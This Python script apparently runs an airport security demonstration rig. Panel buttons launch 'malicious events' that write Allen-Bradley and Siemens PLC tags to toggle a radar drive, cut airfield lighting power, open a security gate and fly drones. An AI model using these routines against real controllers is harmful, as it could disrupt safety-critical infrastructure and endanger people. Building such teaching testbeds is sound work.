#!/usr/bin/env python3
import atexit
import logging
from logging import config as logging_config
from configparser import ConfigParser
import multiprocessing
import os
import sys
import threading
import time
import traceback
import signal
import pyttsx3
import pycomm3
from pycomm3 import SLCDriver
import requests
import signal
import snap7
from snap7.util import *
from scapy.all import *
from tello import *
from pylogix import PLC

CURRENT_DIRECTORY = os.path.abspath( os.path.dirname(__file__) )
DEFAULT_CONFIGURATION_FILE = 'configuration.ini'

root = logging.getLogger()
root.setLevel(logging.DEBUG)
FILLER_MESSAGE   = "This is a short filler message"
SIMPLE_FORMATTER = "%(asctime)s %(levelname)s %(threadName)s %(name)s %(message)s"
ROOT_CONFIGURATION = None
DEFAULT_LOGGING_CONFIG = {
    "version": 1,
    "disable_existing_loggers": False,
    "formatters": {
        "default": {
            "format": "%(asctime)s - [%(module)s:%(levelname)s] [%(filename)s:%(lineno)d] - %(message)s"
        },
        "root": {
            "format": "ROOT - %(asctime)s - [%(module)s:%(levelname)s] [%(filename)s:%(lineno)d] - %(message)s"
        }
    },
    "handlers": {
        "console": {
            "class": "logging.StreamHandler",
            "formatter": "default"
        },
        "root_console": {
            "class": "logging.StreamHandler",
            "formatter": "root"
        },
        "file":{
            "formatter":"default",
            "class":"logging.FileHandler",
            "level":"INFO",
            "filename":"puppetmaster.log"
        }        
    },
    "loggers": {
        "app": {
            "handlers": ["console"],
            "level": "INFO",
            # Don't send it up my namespace for additional handling
            "propagate": False
        }
    },
    "root": {
        "handlers": ["root_console","file"],
        "level": "INFO"
    }
}

logging_config.dictConfig(DEFAULT_LOGGING_CONFIG)

ACTIVE_LIGHT         = "B3:0/1"
SCENARIO_IN_PROGRESS = "B3:0/2"
BUTTON_NOT_IMPLEMENTED_YET = "story teller has not programmed this button yet, please try again"

logger = logging.getLogger('')

def ping_host( ipaddr : str, max_wait=10 ) -> bool:
    result = False

    icmp_packet = IP(dst=ipaddr)/ICMP( )
    try:
        response = sr1( icmp_packet, timeout=max_wait )
        if not response:
            logger.warning( 'host did not respond in time to ICMP request' )
        else:
            logger.info( 'host appears to have responded!' )
            result = True
    except:
        logger.warning( 'failed to send ICMP packet via scapy, assuming host NOT online' )
        logger.warning( traceback.format_exc() )

    return result

def shutdown( configuration ):
    plc_address = configuration.get( 'controller', 'address' )
    try:
        plc = SLCDriver( plc_address )
        plc.open( )
        logger.info( 'connected to scenario controller PLC at {}!'.format(plc_address) )
        
        plc.write( (ACTIVE_LIGHT, False) )
        plc.write( (SCENARIO_IN_PROGRESS,False) )
        logger.info( 'reset puppet master PLC' )
    except:
        logger.warning( 'graceful exit failed' )

def handle_shutdown( signum, frame ):
    global ROOT_CONFIGURATION
    if ROOT_CONFIGURATION:
        configuration = ROOT_CONFIGURATION
        plc_address = configuration.get( 'controller', 'address' )
        try:
            plc = SLCDriver( plc_address )
            plc.open( )
            logger.info( 'connected to scenario controller PLC at {}!'.format(plc_address) )
        
            plc.write( (ACTIVE_LIGHT, False) )
            plc.write( (SCENARIO_IN_PROGRESS,False) )
            logger.info( 'reset puppet master PLC' )
            plc.close( )
        except:
            logger.warning( 'graceful exit failed' )

def write_output( client, byte, bit, command ):
    logger.info( 'write output {}.{} to siemens PLC'.format(byte,bit) )
    data, = client.read_area( snap7.type.Area.PA, 0, byte, 1 )
    logger.info( data )
    #set_bool( data, byte, bit, command )
    if command:
        data &= ~(1 << bit)
    else:
        data |= (1 << bit)

    client.write_area( snap7.type.Area.PA, 0, byte, bytearray([data]) )

def write_merker( client, byte_offset, bit_offset, disable ):
    val, = client.read_area( snap7.type.Area.MK, 0, byte_offset, 1)
    if disable:
        val &= ~(1 << bit_offset)
    else:
        val |= (1 << bit_offset)
    return client.write_area( snap7.type.Area.MK, 0, byte_offset, bytearray([val]) )

def read_from_datablock( client, byte_offset, data_block=1, size=1 ):
    return client.read_area( snap7.type.Area.DB, data_block, byte_offset, size )

def write_to_datablock( client, byte_offset, data_block, value ):
    return client.write_area( snap7.type.Area.DB, data_block, byte_offset, bytearray([value]) )

def hack_the_radar( configuration, gipetto ):
    logger.info( 'launching evil payload to sping the RADAR incessentantly' )
    is_started = True

    rapcon_controller = "{}".format( configuration.get('radar','rapcon_controller') )
    with PLC( rapcon_controller ) as plc:
        programs = plc.GetProgramsList( )
        logger.info( programs )
        main_program = programs.Value[0]
        logger.info( 'listing tags' )
        tags = plc.GetTagList( )
        logger.info( tags )
        for t in tags.Value:
            logger.info( "Tag:{} is {}".format(t.TagName,t.DataType) )
        logger.info( 'query start value' )
        start_tag = "DRIVE_START_M".format(main_program)
        stop_tag  = "DRIVE_STOP_M".format(main_program)

        ret      = plc.Read( start_tag )
        stop_ret = plc.Read( stop_tag )
        if ret.Status:
            is_started = ret.Value
            logger.info( 'obtained start value-->{}'.format(is_started) ) 
    
        if ret.Value:
            logger.warning( 'RADAR is currently running? we are stopping that' )
            sys.exit( 0 )

        count = 0
        try:
            while count < configuration.getint( 'radar', 'count' ):
                logger.info( 'start that RADAR NOWWWWWWW' )
                ret = plc.Write( stop_tag, False )
                ret = plc.Write( start_tag, True )
                logger.info( "{}, {}, {}".format(ret.TagName, ret.Value, ret.Status) )
                time.sleep( 3 )
                logger.info( 'stopping RADAR to screw with the victims' )
                ret = plc.Write( stop_tag, True )
                ret = plc.Write( start_tag, False )
                time.sleep( 4 )
                count += 1
        except KeyboardInterrupt:
            logger.warning( 'ok looks like the puppet master is gettin ancy' )
        
        logger.info( 'stop the RADAR like a good little robit' )
        ret = plc.Write( start_tag, False )
        ret = plc.Write( stop_tag, True )

    logger.info( 'disconnected from RAPCON plc, wait a beat' )
    time.sleep( 3 )

    logger.info( 'finished messing with the RADAR dawg' )

def fly_all_drones( configuration, gipetto ):
    found_drone = False
    running_flights = []
    logger.info( 'start flying all drones found dawg' )
    drones_found = arp_ping( )
    logger.info( 'lets launch every drone we found!' )
    for d in drones_found:
        ip = d['IP']
        km = d['MAC']
        if ip:
            drone_flight = multiprocessing.Process( target=fly_drone_pattern, args=(ip,) )
            drone_flight.start( )
            running_flights.append( drone_flight )
            logger.info( 'launched a drone!' )
            found_drone = True

    if not found_drone:
        logger.error( 'my bad, I didnt find any drones to fly' )
        return

    keep_checking   = True
    flights_started = len( running_flights )
    flights_running = len( running_flights )
    flights_closed  = []
    while keep_checking:
        for rf in running_flights:
            if rf not in flights_closed:
                if rf.is_alive( ) and not rf.exitcode:
                    logger.info( 'this flight is still running' )
                else:
                    rf.close( )
                    flights_running -= 1
                    flights_closed.append( rf )

        if flights_running == 0:
            keep_checking = False
        time.sleep( 2 )
    logger.info( 'all done with the flights my friend' )

def fly_a_drone( configuration, gipetto ):
    found_drone = False
    logger.info( 'starting drone flight' )
    drones_found = arp_ping( )
    logger.info( drones_found )
    for d in drones_found:
        ip = d['IP']
        km = d['MAC']
        if ip:
            logger.info( 'chose a drone from {}, as {}'.format(km,ip) )
            fly_drone_pattern( ip )
            found_drone = True
            break
        else:
            logger.info( 'failed to resolve drone {}, try the next available DRONE'.format(km) )

    if not found_drone:
        logger.error( 'sorry pal, unable to find a drone' )

def interact_with_atis( configuration, gipetto ):
    logger.info( 'performing simple interaction with ATIS' )
    base_url = "http://{}".format( configuration.get('atis','address') )

    #logger.info( 'enable lighting base in terminal' )
    #r = requests.get( "http://{}/stop".format(configuration.get('lighting','main_terminal')) )
    #r = requests.get( "http://{}/on".format(configuration.get('lighting','main_terminal')) )

    logger.info( 'playing welcome message' )
    r = requests.get( "{}{}".format(base_url,configuration.get('atis','welcome_msg')) )

    logger.info( 'recieved {} status code, play tour now'.format(r.status_code) )
   
    #logger.info( 'enable knight rider lighting' )
    #r = requests.get( "http://{}/start".format(configuration.get('lighting','main_terminal')) )
    
    r = requests.get( "{}{}".format(base_url,configuration.get('atis','tour_msg')) )

    logger.info( 'atis interaction complete' )
    #r = requests.get( "http://{}/stop".format(configuration.get('lighting','main_terminal')) )

def drive_alcms( configuration, gipetto ):
    logger.info( 'operate ALCMS normally' )
    base_url       = "http://{}".format( configuration.get('atis','address') )
    siemens_client = None
    try:
        logger.info( 'connect to S7-1200 managing ALCMS' )
        siemens_client = snap7.client.Client( )
        alcms_instance = siemens_client.connect( configuration.get('siemens','alcms'),0,1 ) 
        if alcms_instance:
            logger.info( 'connected' )
            write_merker( alcms_instance, 0, 1, True  )
            write_merker( alcms_instance, 0, 2, False)
            write_to_datablock( alcms_instance, 0, 1, 0 )
            logger.info( 'playing ALCMS tour message 1' )
            r = requests.get( "{}{}".format(base_url,configuration.get('atis','alcms_1')) )

            write_merker( alcms_instance, 0, 1, False )
            write_merker( alcms_instance, 0, 2, True )
            logger.info( 'playing ALCMS tour message 2' )
            time.sleep( 3 )
            r = requests.get( "{}{}".format(base_url,configuration.get('atis','alcms_2')) )

            write_merker( alcms_instance, 0, 1, True )
            write_merker( alcms_instance, 0, 2, False )
            
            write_output( alcms_instance, 12, 5, False )
            time.sleep( 5 )

            logger.info( 'finished...' )
    except:
        logger.error( 'failed to operate ALCMS properly' )
        logger.error( traceback.format_exc() )
    finally:
        if siemens_client and alcms_instance:
            write_merker( alcms_instance, 0, 1, True )
            write_merker( alcms_instance, 0, 2, False)
            write_merker( alcms_instance, 0, 3, True )
            write_to_datablock( alcms_instance, 0, 1, 0 )
            write_output( alcms_instance, 12, 5, True )
            alcms_instance.destroy( )

def interact_with_afhsd( configuration, gipetto ):
    logger.info( 'operate fuel system remotely now' )
    base_url       = "http://{}".format( configuration.get('atis','address') )

    r = requests.get( "{}{}".format(base_url,configuration.get('atis','afhsd_1')) )

def open_security_gate( configuration, gipetto ):
    logger.info( 'remotely opening security gate now' )
    REMOTE_TRIGGER = "B3:0/3"
    try:
        with SLCDriver( configuration.get('security','gate_controller') ) as security_gate_plc:
            security_gate_plc.write( (REMOTE_TRIGGER, False) )
            logger.info( 'connected to security gate' )
            time.sleep( configuration.getint('security', 'gate_wait') )
            security_gate_plc.write( (REMOTE_TRIGGER, True) )
            logger.info( 'triggered remote open' )

            time.sleep( configuration.getint( 'security', 'gate_wait') )
            security_gate_plc.write( (REMOTE_TRIGGER, False) )
    except:
        logger.error( 'failed interacting with security gate controller' )
        logger.error( traceback.format_exc() )

def cut_power_to_alcms( configuration, gipetto ):
    logo_instance = None
    byte_offset   = 0
    logger.info( 'cutting power to ACLMS via power controller' )

    try:
        logger.info( 'connecting to PLC' )
        siemens_client = snap7.client.Client( )
        logo_instance = siemens_client.connect( configuration.get('siemens','power'),0,1 ) 
        if logo_instance:
            logger.info( 'connected to power PLC device' )
            
            logger.info( read_from_datablock(siemens_client,byte_offset) )
            write_merker( siemens_client, 0, 2, False )
            
            logger.info( 'all lights should be out!!' )

            logger.info( read_from_datablock(siemens_client,byte_offset) )
            
            time.sleep( configuration.getint('time', 'effect_wait') )
            write_merker( logo_instance, 0, 2, True )
            write_output( logo_instance, 0, 0, True )
            
            logger.info( 'starting ALCMS connection' )
            siemens_client_2 = snap7.client.Client( )
            alcms_instance = siemens_client_2.connect( configuration.get('siemens','alcms'),0,1 ) 
            if siemens_client_2 and alcms_instance:
                logger.info( 'connected to ALCMS, make sure the ALCMS lights turn off' )
                write_merker( alcms_instance, 0, 1, True )
                write_merker( alcms_instance, 0, 2, False)
                write_merker( alcms_instance, 0, 3, True )
                write_to_datablock( alcms_instance, 0, 1, 0 )
                write_output( alcms_instance, 12, 5, True )
                alcms_instance.destroy( )
                siemens_client_2.destroy( )
                logger.info( 'disconnected from ALCMS direct' )
            
            logger.info( read_from_datablock(siemens_client,byte_offset) )
            
            logger.info( 'disconnecting from PLC' )
            siemens_client.destroy( )
            logger.info( 'should be disconnected from power controller' )
    except:
        logger.error( 'experienced failure in manipulating power on ALCMS!' )
        logger.error( traceback.format_exc() )
        
    logger.info( 'power should be restored' )

def repair_alcms_power( configuration ):
    byte_offset   = 0
    logger.info( 'make sure power is flowin to the ALCMS lights!' )
    siemens_client = snap7.client.Client( )
    try:
        logo_instance = siemens_client.connect( configuration.get('siemens','power'),0,1 ) 
        if logo_instance:
            logger.info( 'connected to power PLC device' )
            logger.info( read_from_datablock(logo_instance,byte_offset) )
            write_merker( logo_instance, 0, 2, True )
            write_output( logo_instance, 0, 0, True )
            siemens_client.destroy( )
    except RuntimeError:
        logger.error( 'failed to reach the backup power controller! Is switch 3 turned on?' )
        sys.exit( -8 )
    return True

def fresh_slate( puppet_master_plc, configuration ):
    logger.info( 'make sure the various devices are fresh and ready' )
    puppet_master_plc.write( (ACTIVE_LIGHT, True) )
    puppet_master_plc.write( (SCENARIO_IN_PROGRESS,False) )
    
    repair_alcms_power( configuration )

    logger.info( 'ok, you should be ready to start pressin buttons!' )

def verify_assets_online( configuration : ConfigParser ) -> bool:
    result = True 
    logger.info( 'ok, verify required assets are online' )
    try:
        plc_address = puppet_master_conf.get( 'controller', 'address' )
        if not ping_host( plc_address ):
            logger.info( "unable to reach main PLC at {}!, is AllenBradley PLC in back of cart online?".format(plc_address) )
            return False
        logger.info( "puppet master PLC is online, check PA system" )

        pa_system = configuration.get('atis','address')
        if pa_system.find( ":" ) != -1:
            pa_system = pa_system.split(":")[0]
        if not ping_host( pa_system ):
            logger.info( "unable to reach PA system! Is that device powered on? Is the PA web application started" )
            return False

        logger.info( 'PA system is online!' )
        if not ping_host( configuration.get('radar','rapcon_controller') ):
            logger.info( 'cannot reach the RAPCON controller?' )
            return False
    except:
        logger.warning( 'failed to verify required assets online' )
        result = False
    return result

if __name__ == "__main__":
    malicious_event = None

    gipetto = pyttsx3.init( )
    stop_event = threading.Event( )
    puppet_master_conf = ConfigParser()
    puppet_master_conf.read( os.path.join(CURRENT_DIRECTORY,DEFAULT_CONFIGURATION_FILE) )
    ROOT_CONFIGURATION = puppet_master_conf
    atexit.register( shutdown, puppet_master_conf )
    signal.signal( signal.SIGTERM, handle_shutdown )
    gipetto.setProperty( 'rate', puppet_master_conf.get( 'time', 'talking_rate') )
    
    if not verify_assets_online( puppet_master_conf ):
        logger.error( 'exiting!' )
        gipetto.say( 'did not verify required airport systems, please check network and try again!' )
        gipetto.runAndWait( )
        sys.exit( -1 )

    gipetto.say( 'Welcome to A Day Ga Airport' )
    gipetto.runAndWait( )
    plc_address = puppet_master_conf.get( 'controller', 'address' )
    logger.info( 'connecting to puppet {}'.format(plc_address) )
    try:
        plc = SLCDriver( plc_address )
        plc.open( )
        logger.info( 'connected to scenario controller PLC at {}!'.format(plc_address) )
        
        fresh_slate( plc,puppet_master_conf )

        plc.write( (ACTIVE_LIGHT, True) )
        status_table     = {}
        button_1_pressed = False
        button_2_pressed = False
        button_3_pressed = False
        button_4_pressed = False
        button_5_pressed = False
        button_6_pressed = False
        while not stop_event.is_set( ):
            try:
                if malicious_event and type(malicious_event) == multiprocessing.Process:
                    if malicious_event.is_alive( ) and not malicious_event.exitcode:
                        logger.debug( 'waiting for malcious event in process {} to complete!'.format(malicious_event.pid) )
                    else:
                        logger.info( 'malicious event has completed with exit code {}!'.format(malicious_event.exitcode) )
                        malicious_event.close( )
                        malicious_event = None
                        plc.write( (SCENARIO_IN_PROGRESS,False) )
                        time.sleep( 3 )
                        gipetto.say( 'feel free to run another payload' )
                        gipetto.runAndWait( )
                else:
                    status_table["1"] = plc.read( 'I0:0/0' )
                    status_table["2"] = plc.read( 'I0:0/1' )
                    status_table["3"] = plc.read( 'I0:0/2' )
                    status_table["4"] = plc.read( 'I0:0/3' )
                    status_table["5"] = plc.read( 'I0:0/4' )
                    status_table["6"] = plc.read( 'I0:0/5' )
                    status_table["7"] = plc.read( 'I0:0/6' )

                    button_1_pressed = status_table["1"][1]
                    button_2_pressed = status_table["2"][1]
                    button_3_pressed = status_table["3"][1]
                    button_4_pressed = status_table["4"][1]
                    button_5_pressed = status_table["5"][1]
                    button_6_pressed = status_table["6"][1]
                    button_7_pressed = status_table["7"][1]

                    time.sleep( 0.125 )
                    if button_1_pressed:
                        gipetto.say( 'cutting power to airfield lighting for a few seconds' )
                        gipetto.runAndWait( )
                        malicious_event = multiprocessing.Process( name='cut_alcms_power', target=cut_power_to_alcms, args=(puppet_master_conf,gipetto,) )
                    elif button_2_pressed:
                        gipetto.say( 'launching illegal UAV flight in airspace ')
                        gipetto.runAndWait( )
                        #malicious_event =  multiprocessing.Process( name='fly_a_drone', target=fly_a_drone, args=(puppet_master_conf,gipetto,) )
                        malicious_event =  multiprocessing.Process( name='fly_all_drones', target=fly_all_drones, args=(puppet_master_conf,gipetto,) )
                    elif button_3_pressed:
                        gipetto.say( 'remotely opening security gate' )
                        gipetto.runAndWait( )
                        malicious_event = multiprocessing.Process( name='open_security_gate', target=open_security_gate, args=(puppet_master_conf,gipetto,) )
                    elif button_4_pressed:
                        gipetto.say( 'attempting to disrupt radar operation' )
                        gipetto.runAndWait( )
                        malicious_event = multiprocessing.Process( name='hack_radar', target=hack_the_radar, args=(puppet_master_conf,gipetto,) )
                    elif button_5_pressed:
                        malicious_event = multiprocessing.Process( name='interact_with_atis', target=interact_with_atis, args=(puppet_master_conf,gipetto,) )
                    elif button_6_pressed:
                        gipetto.say( 'operate lighting safely' )
                        gipetto.runAndWait( )
                        malicious_event  = multiprocessing.Process( name='drive_alcms_normal', target=drive_alcms, args=(puppet_master_conf,gipetto,) )
                    elif button_7_pressed:
                        gipetto.say( 'operate fuel system' )
                        gipetto.runAndWait( )
                        malicious_event  = multiprocessing.Process( name='operate_afhsd_1', target=interact_with_afhsd, args=(puppet_master_conf, gipetto,) )
                    if malicious_event and type(malicious_event) == multiprocessing.Process:
                        plc.write( (SCENARIO_IN_PROGRESS,True) )
                        logger.info( 'starting a simulated event now!' )
                        malicious_event.start( )
            except KeyboardInterrupt:
                plc.write( (ACTIVE_LIGHT, False) )
                stop_event.set( )
            except:
                logger.error( 'a general error has occurred! stoppin to ensure safety' )
                logger.error( traceback.format_exc() )
                stop_event.set( )
        plc.write( (SCENARIO_IN_PROGRESS,False) )
        gipetto.say( "puppet master shutdown, have a nice day" )
        gipetto.runAndWait( )
    except pycomm3.exceptions.CommError:
        logger.exception( 'failed to connect to PLC!' )
    finally:
        if plc:
            logger.info( 'treat PLC as idle now and shutdown' )
            plc.write( (ACTIVE_LIGHT, False) )
            plc.write( (SCENARIO_IN_PROGRESS,False) )

